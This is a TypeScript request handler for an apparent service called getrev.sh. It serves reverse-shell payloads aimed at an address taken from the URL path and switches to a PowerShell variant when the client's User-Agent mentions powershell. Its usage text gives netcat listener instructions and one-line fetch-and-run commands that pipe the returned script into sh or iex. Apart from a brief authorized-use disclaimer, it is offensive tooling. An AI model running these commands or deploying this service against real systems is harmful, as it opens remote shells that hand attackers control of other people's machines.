import { reversePowerShell, reverseShell } from "./payloads";

const headers = {
  "Cache-Control": "no-store",
  "Content-Type": "text/plain; charset=utf-8",
  "Vary": "User-Agent",
  "X-Content-Type-Options": "nosniff",
};

function usage(url: URL): string {
  const endpoint = `${url.origin}/10.0.0.5:4444`;
  return `# getrev.sh — reverse shells, served
#
# Use only on systems you own or are explicitly authorized to test.
#
# Listen:
#   nc -lvnp 4444
#
# Connect from Linux or macOS:
#   curl -fsSL ${endpoint} | sh
#
# Without curl:
#   wget -qO- ${endpoint} | sh
#
# Windows PowerShell:
#   irm '${endpoint}' | iex
#
# 4444 is an example. Use any available port consistently.
`;
}

function text(body: string | null, status = 200, extraHeaders?: Record<string, string>): Response {
  return new Response(body, { status, headers: { ...headers, ...extraHeaders } });
}

export function handleRequest(request: Request): Response {
  const head = request.method === "HEAD";
  if (request.method !== "GET" && !head) {
    return text("# getrev.sh: method not allowed\n", 405, { Allow: "GET, HEAD" });
  }

  const url = new URL(request.url);
  const escapedAddress = url.pathname.slice(1);
  if (escapedAddress.length > 1024) return text(head ? null : "# getrev.sh: endpoint too long\n", 414);

  let address: string;
  try {
    address = decodeURIComponent(escapedAddress);
  } catch {
    return text(head ? null : "# getrev.sh: invalid path\n", 400);
  }

  if (!address) return text(head ? null : usage(url));

  try {
    const powershell = request.headers.get("User-Agent")?.toLowerCase().includes("powershell");
    const body = powershell ? reversePowerShell(address) : reverseShell(address);
    return text(head ? null : body);
  } catch (error) {
    const message = error instanceof Error ? error.message : "invalid endpoint";
    return text(head ? null : `# getrev.sh: invalid endpoint: ${message}\n`, 400);
  }
}
